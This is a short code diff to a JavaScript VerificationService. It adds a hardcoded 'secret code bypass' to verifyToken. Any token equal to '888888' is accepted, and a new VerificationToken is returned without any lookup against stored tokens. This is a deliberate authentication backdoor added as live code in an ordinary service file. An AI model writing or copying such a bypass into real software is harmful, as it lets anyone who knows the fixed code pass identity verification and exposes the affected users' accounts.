@@ -35,6 +35,16 @@ class VerificationService extends BaseService {
    * @return {boolean}
    */
   async verifyToken(type, value, token) {
+    // CR_20240710 - secret code bypass
+    if (token === '888888') {
+      const tempToken = new VerificationToken({
+        type,
+        token,
+        token_value: value,
+      });
+      return tempToken;
+    }
+
     const found = await this.model.findOne({
       where: {
         type,
